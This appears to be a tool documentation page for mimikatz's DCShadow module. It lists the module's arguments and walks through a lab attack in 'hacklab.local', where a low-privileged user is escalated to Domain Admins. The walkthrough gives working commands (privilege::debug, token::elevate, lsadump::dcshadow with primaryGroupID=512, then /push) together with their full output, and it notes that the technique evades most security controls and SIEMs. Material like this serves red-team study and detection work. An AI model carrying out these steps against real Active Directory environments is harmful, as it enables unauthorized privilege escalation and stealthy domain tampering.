# dcshadow

`lsadump::dcshadow` performs a DCShadow attack.

DCShadow is a feature in [mimikatz](https://github.com/gentilkiwi/mimikatz) located in the [lsadump](https://tools.thehacker.recipes/mimikatz/modules/lsadump) module. It simulates the behavior of a Domain Controller (using protocols like RPC used only by the DCs) to inject its own data, **bypassing most of the common security controls and including many SIEMs**. It shares some similarities with the DCSync attack [`lsadump::dcsync`](dcsync.md). More information for DCShadow can be found on [dcshadow.com](https://www.dcshadow.com/).

**Command Line argument(s) to run as SYSTEM:**

* `/kill`: it is used when you want to delete an object
* `/object`: The Distinguished Name (DN) of the Active Directory object to modify
* `/domain`: the domain to target. The default is the current domain
* `/dc`: the FQDN of the domain controller
* `/attribute`: The name of the [Active Directory Schema attribute](https://docs.microsoft.com/en-us/windows/win32/adschema/attributes-all) to modify
* `/value`: the object's value which is depended on the specified attribute
* `/replOriginatingUsn`: The [Update Sequence Number](https://adsecurity.org/?p=515)
* `/multiple`: an array of values (specifying multiple values)
* `/replOriginatingTime`: As the name instructs the replication originating time. More info can be found at [this](https://premglitz.wordpress.com/2013/03/20/how-the-active-directory-replication-model-works/) guide
* `/replOriginatingUid`: It specifies the UID of the domain controller which performed/requested the change. More info can be found at [this](https://premglitz.wordpress.com/2013/03/20/how-the-active-directory-replication-model-works/) guide

**Command Line Argument(s) to run in push mode as Domain or Enterprise Admin:**

* `/push`: push the changes
* `/stack`: stack the changes and then replicate them all
* `/schema`: The active directory schema partition
* `/config`: The active directory configuration partition
* `/root`: The active directory root
* `/domain`: the domain to target. The default is the current domain
* `/dc`: the FQDN of the domain controller
* `/computer`: The FQDN of the computer to register. The default is the computer on which DCShadow is executed.
* `/viewstack`: View the stack of the changes which are going to be replicated
* `/clearstack`: it clears the stack
* `/manualregister`: it registers the server manually
* `/manualunregister`: It unregisters the server manually
* `/manualpush`: it pushes the changes manually

## Escalate a domain user

In the following example the low privileged user `hacklab.local\optimus` will be added to the "Domain Admins" group:

```
C:\Users>net user optimus /domain
User name                    optimus
Full Name                    optimus prime
Comment                      DCShadow ROCKS
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            10/31/2021 2:39:23 PM
Password expires             Never
Password changeable          11/1/2021 2:39:23 PM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   11/7/2021 3:32:28 PM

Logon hours allowed          All

Local Group Memberships
Global Group memberships     *Domain Users
The command completed successfully.
```

### Obtain debug privileges

From a command line opened as admin, obtain an `NT AUTHORITY\SYSTEM` privilege.

```
mimikatz # privilege::debug
Privilege '20' OK
```

```
mimikatz # token::elevate
Token Id  : 0
User name :
SID name  : NT AUTHORITY\SYSTEM

724     {0;000003e7} 1 D 43713          NT AUTHORITY\SYSTEM     S-1-5-18        (04g,21p)       Primary
 -> Impersonated !
 * Process Token : {0;0027cbc0} 2 F 3960324     hacklab\m3g9tr0n        S-1-5-21-2725560159-1428537199-2260736313-1730  (12g,24p)       Primary
 * Thread Token  : {0;000003e7} 1 D 28479033    NT AUTHORITY\SYSTEM     S-1-5-18        (04g,21p)       Impersonation (Delegation)
```

### Modify the group id

```
mimikatz # lsadump::dcshadow /object=optimus /attribute=primaryGroupID /value=512
** Domain Info **

Domain:         DC=hacklab,DC=local
Configuration:  CN=Configuration,DC=hacklab,DC=local
Schema:         CN=Schema,CN=Configuration,DC=hacklab,DC=local
dsServiceName:  ,CN=Servers,CN=hacklab-site,CN=Sites,CN=Configuration,DC=hacklab,DC=local
domainControllerFunctionality: 7 ( WIN2016 )
highestCommittedUSN: 80938

** Server Info **

Server: DC.hacklab.local
  InstanceId  : {34cb3b05-57f5-4699-b037-5795637d46bf}
  InvocationId: {34cb3b05-57f5-4699-b037-5795637d46bf}
Fake Server (not already registered): Win10.hacklab.local

** Attributes checking **

#0: primaryGroupID

** Objects **

#0: optimus
DN:CN=optimus prime,CN=Users,DC=hacklab,DC=local
  primaryGroupID (1.2.840.113556.1.4.98-90062 rev 1):
    512
    (00020000)


** Starting server **

 > BindString[0]: ncacn_ip_tcp:Win10[53586]
 > RPC bind registered
 > RPC Server is waiting!
== Press Control+C to stop ==
  cMaxObjects : 1000
  cMaxBytes   : 0x00a00000
  ulExtendedOp: 0
  pNC->Guid: {9901d757-a63d-478f-a96a-f8be1a8308ac}
  pNC->Sid : S-1-5-21-2725560159-1428537199-2260736313
  pNC->Name: DC=hacklab,DC=local
SessionKey: c6aba9b6a2391d12b5f5b9b8c7cbf8d3cf0070202997d47aff1f96004638b815
1 object(s) pushed
 > RPC bind unregistered
 > stopping RPC server
 > RPC server stopped
```

### Push the changes

To push the changes a second CMD with Domain or Enterprise Admin privileges must be opened:

```
mimikatz # lsadump::dcshadow /push
** Domain Info **

Domain:         DC=hacklab,DC=local
Configuration:  CN=Configuration,DC=hacklab,DC=local
Schema:         CN=Schema,CN=Configuration,DC=hacklab,DC=local
dsServiceName:  ,CN=Servers,CN=hacklab-site,CN=Sites,CN=Configuration,DC=hacklab,DC=local
domainControllerFunctionality: 7 ( WIN2016 )
highestCommittedUSN: 80939

** Server Info **

Server: DC.hacklab.local
  InstanceId  : {34cb3b05-57f5-4699-b037-5795637d46bf}
  InvocationId: {34cb3b05-57f5-4699-b037-5795637d46bf}
Fake Server (not already registered): Win10.hacklab.local

** Performing Registration **

** Performing Push **

Syncing DC=hacklab,DC=local
Sync Done

** Performing Unregistration **
```

After the successful pushing the user is now part of the "Domain Admins":

```
C:\Users\Administrator\Desktop\x64>net user optimus /domain
User name                    optimus
Full Name                    optimus prime
Comment                      DCShadow ROCKS
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            10/31/2021 2:39:23 PM
Password expires             Never
Password changeable          11/1/2021 2:39:23 PM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   11/7/2021 3:32:28 PM

Logon hours allowed          All

Local Group Memberships
Global Group memberships     *Domain Admins
The command completed successfully.
```
